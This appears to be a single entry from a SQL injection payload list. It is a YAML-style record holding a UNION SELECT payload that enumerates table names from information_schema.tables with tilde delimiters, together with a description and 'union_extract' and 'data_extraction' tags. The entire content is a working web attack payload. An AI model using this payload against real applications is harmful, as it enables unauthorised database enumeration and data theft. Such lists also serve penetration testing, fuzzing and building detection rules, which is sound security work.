  - payload: "' UNION SELECT 1,GROUP_CONCAT(0x7e,table_name,0x7e),3 FROM information_schema.tables -- -"
    description: "Extract table names with tilde delimiters"
    technique: "union_extract"
    tag: "data_extraction"

